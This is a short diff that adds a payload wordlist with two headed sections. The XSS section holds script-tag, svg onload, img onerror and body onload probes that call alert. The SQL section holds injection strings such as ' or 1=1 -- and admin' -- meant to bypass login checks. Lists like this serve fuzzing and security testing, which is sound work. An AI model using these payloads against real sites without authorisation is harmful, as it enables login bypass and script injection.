@@ -1,0 +1,13 @@
+# XSS
+<SCript>alert('script')</scriPt>
+<svg/onload=alert('SVG')>
+<img src onerror="alert(2)">
+<BODY ONLOAD=alert('XSS')>
+
+# SQL
+ -- 
+admin' -- 
+root' -- 
+' or 1=1 -- 
+' or "
+'LIKE'
